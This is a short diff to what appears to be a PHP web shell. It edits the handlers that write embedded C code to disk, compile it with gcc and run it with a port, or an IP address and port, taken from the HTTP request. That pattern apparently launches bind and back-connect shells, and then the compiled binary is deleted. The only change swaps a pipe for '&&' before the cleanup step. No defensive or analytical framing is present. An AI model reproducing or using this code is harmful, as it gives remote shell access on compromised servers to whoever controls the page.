@@ -1651,7 +1651,7 @@ switch ($_REQUEST['p']) {
      else {
       fwrite($fh,$cbdcode);
       fclose($fh);
-      $c=search("gcc",$failflag)." -w ".$exec_path." -o ".$exec_path." && ".$exec_path." ".$_POST["port"]." | rm -f ".$exec_path."";
+      $c=search("gcc",$failflag)." -w ".$exec_path." -o ".$exec_path." && ".$exec_path." ".$_POST["port"]." && rm -f ".$exec_path."";
       run($c);
       echo "<br><br><font color=\"green\">clocal done</font>";
      }
@@ -1667,7 +1667,7 @@ switch ($_REQUEST['p']) {
      else {
       fwrite($fh,$cbccode);
       fclose($fh);
-      $c=search("gcc",$failflag)." ".$exec_path." -o ".$exec_path." && ".$exec_path." ".$_POST["ip"]." ".$_POST["port"]." | rm -f ".$exec_path."";
+      $c=search("gcc",$failflag)." ".$exec_path." -o ".$exec_path." && ".$exec_path." ".$_POST["ip"]." ".$_POST["port"]." && rm -f ".$exec_path."";
       run($c);
      }
     break;
